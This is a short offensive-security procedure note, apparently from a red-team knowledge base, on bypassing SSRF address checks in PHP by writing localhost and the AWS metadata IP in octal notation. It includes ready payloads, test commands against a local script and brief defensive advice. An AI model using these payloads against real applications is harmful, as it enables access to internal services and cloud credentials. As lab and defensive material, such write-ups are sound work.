---
tags:
  - ssrf
  - bypass
  - octal
type: procedure
tools:
  - '[[tools/cURL]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/throw-if-local-address-validation]]'
  - '[[commands/curl-fetch-internal-resource]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.261Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: e245817d-b50f-4efc-b554-45158a473d36
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Octal-IP-Notation-Bypass

## Summary

This procedure uses octal IP notation to fully bypass both IP and address validations for SSRF to localhost and cloud metadata.

## Description

Octal payloads like `http://0177.0.0.1/` (127.0.0.1) and `0251.0376.0251.0376` (169.254.169.254) evade parse_url and filter_var normalization, passing all checks and triggering cURL to internal endpoints. This allows access to localhost services or AWS metadata, potentially disclosing sensitive data or enabling escalation.

## Requirements

1. Updated PHP test script with cURL integration
2. Localhost service running (e.g., simple HTTP server)
3. AWS-like metadata endpoint simulated if needed

## Defense

Defensive measures and detection strategies:

- Normalize IPs by converting octal/decimal/hex before validation (e.g., using inet_pton)
- Proxy all outbound requests through a validated allowlist

## Objectives

1. Evade parsing in parse_url and filter_var
2. Fetch content from localhost or metadata
3. Demonstrate full SSRF chain

## Instructions

### Step 1: Prepare Octal Payloads

**Context**: Convert IPs to octal (127=0177, 169=0251, 254=0376).

No command; craft `http://0177.0.0.1/` and `http://0251.0376.0251.0376/`.

> Expected: Payloads ready.

### Step 2: Test Localhost Bypass

**Context**: Use host validation to trigger cURL.

Execute [[commands/throw-if-local-address-validation]] with ?host=http://0177.0.0.1/:

```bash
php test.php?host=http://0177.0.0.1/
```

> Expected: Fetched localhost content; no exception.

### Step 3: Test Metadata Access

**Context**: Confirm cloud endpoint reachability.

Execute [[commands/curl-fetch-internal-resource]] embedded, with ?host=http://0251.0376.0251.0376/:

```bash
php test.php?host=http://0251.0376.0251.0376/
```

> Expected: Metadata response; logs show internal request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/throw-if-local-address-validation]]
- [[commands/curl-fetch-internal-resource]]

## Tools Used

- [[tools/cURL]]

## Tags

- ssrf
- bypass
- octal
